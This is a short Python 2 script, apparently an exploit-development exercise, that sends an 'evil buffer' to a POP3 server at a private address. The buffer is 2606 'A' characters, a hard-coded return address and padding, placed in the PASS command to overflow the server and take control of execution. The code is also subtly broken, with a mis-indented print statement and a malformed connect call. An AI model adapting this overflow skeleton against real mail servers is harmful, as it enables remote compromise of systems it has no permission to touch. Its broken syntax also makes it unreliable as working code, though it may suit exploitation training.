#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buffer= "A" *2606 + "\x8f\x35\x4a\x5f" + "C" * (3500-2606-4)

try:
print "\nSending evil buffer v1"
	connect=s.connect(('192.168.15.34'),110)
	s.recv(1024)
	s.send('USER usernmae \r\n')
	s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.send('QUIT\r\n')
	s.close()
	print "\nDone!."
except:
	print "Could not find POP3 server\r\n"
